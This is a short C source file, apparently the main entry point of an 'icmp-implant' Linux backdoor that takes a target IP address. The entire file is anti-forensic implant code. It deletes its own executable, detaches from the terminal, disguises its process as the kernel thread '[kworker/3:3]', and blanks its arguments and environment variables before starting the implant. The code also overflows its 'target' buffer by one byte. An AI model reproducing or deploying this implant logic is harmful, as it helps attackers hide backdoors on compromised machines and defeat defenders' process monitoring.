#include "../include/implant.h"

int main(int argc, char **argv, char **envp) {
    if (argc < 2) {
        fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]\n");
        return 1;
    }

    size_t ip_len = strlen(argv[1]);
    char target[ip_len];

    strncpy(target, argv[1], ip_len);

    // remove implant upon execution
    unlink(argv[0]);

    // detach from tty to impersonate a daemon
    ioctl(0, TIOCNOTTY);

    // save the arg for later
    strncpy(target, argv[1], ip_len + 1);

    // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
    strncpy(argv[0], "[kworker/3:3]\0", strlen(argv[0]) + 1);
    strncpy(argv[1], "\0", strlen(argv[1]));

    // kworker thread doesn't have any env variables
    for (int i = 0; envp[i] != NULL; i++) {
        strncpy(envp[i], "\0", strlen(envp[i]));
    }

    implant_init_n_call(target);
    return 0;
}